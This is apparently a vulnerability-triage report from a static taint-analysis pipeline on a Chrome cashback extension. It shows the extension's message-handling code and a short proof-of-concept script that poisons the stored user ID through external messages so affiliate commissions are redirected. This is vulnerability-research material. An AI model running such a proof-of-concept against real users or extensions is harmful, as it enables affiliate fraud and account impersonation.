# CoCo Analysis: edaaldbdmfcpgafbjkdogonmgheiplnk

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/edaaldbdmfcpgafbjkdogonmgheiplnk/opgen_generated_files/bg.js
Line 1152: `if (request.zingoy_app_user_id) {`

**Code:**

```javascript
// Background script (background.js, lines 1150-1174)
chrome.runtime.onMessageExternal.addListener((request, sender, sendResponse) => {
  if (request.zingoy_app_user_id) { // ← attacker-controlled
    chrome.storage.local.set({ "zingoy_app_user_id": request.zingoy_app_user_id }, () => {
      sendResponse({ status: "success" });
    });
  } else if (request.delete_zingoy_app_user_id) {
    chrome.storage.local.set({ "zingoy_app_user_id": "notlogged" }, () => {
      sendResponse({ status: "success" });
    });
  } else {
    sendResponse({ status: "error", message: "Invalid request" });
  }
  return true;
});

// Background script - Port handler (background.js, lines 1178-1232)
chrome.runtime.onConnect.addListener(function(port) {
    port.onMessage.addListener(function(request) {
        if (request.action === "getCurrentUser") {
            if (setCurrentUser) {
                chrome.storage.local.get(["zingoy_app_user_id"], (result) => {
                    currentUser["user_id"] = result["zingoy_app_user_id"];
                    port.postMessage({ action: request.action, result: currentUser }); // ← attacker retrieves poisoned value
                });
            }
        }
    });
});

// Content script usage (store.js, lines 98-111)
function generateAffiliateUrl(item, callback) {
  chrome.storage.local.get("zingoy_app_user_id", (result) => {
    const userId = result.zingoy_app_user_id; // ← poisoned user_id retrieved
    const url = `${zinnyMainUrl}/get-url-detail?user_id=${userId}&url=${window.location.href}`;
    if (callback) {
      callback(url);
    } else {
      window.location.href = url; // ← poisoned user_id used in affiliate URL
    }
  });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From https://www.zingoy.com/* or https://api.zingoy.com/*
// (domains listed in manifest.json externally_connectable)

// Step 1: Poison the storage with attacker's user_id
chrome.runtime.sendMessage('edaaldbdmfcpgafbjkdogonmgheiplnk', {
    zingoy_app_user_id: 'attacker_user_id'
}, function(response) {
    console.log('Storage poisoned:', response);
});

// Step 2: Verify poisoning by retrieving the value
var port = chrome.runtime.connect('edaaldbdmfcpgafbjkdogonmgheiplnk');
port.postMessage({action: 'getCurrentUser'});
port.onMessage.addListener(function(response) {
    console.log('Retrieved poisoned user:', response.result.user_id);
});

// Step 3: Extension will now use attacker's user_id for all affiliate URLs
// across all websites where content scripts run
```

**Impact:** Affiliate hijacking and user impersonation. By poisoning the `zingoy_app_user_id` stored value, an attacker controlling zingoy.com (or exploiting XSS there) can hijack cashback/affiliate commissions across all shopping websites where the extension operates. The poisoned user_id is used to generate affiliate tracking URLs (store.js line 105), causing all cashback earnings to be credited to the attacker's account instead of the legitimate user. Additionally, this creates a complete storage exploitation chain where the attacker can both write and read arbitrary values, potentially enabling user tracking and impersonation within the zingoy system. According to methodology CRITICAL RULE #1, even though only specific domains can exploit this via externally_connectable, if ANY attacker can trigger the flow, it's classified as TRUE POSITIVE.
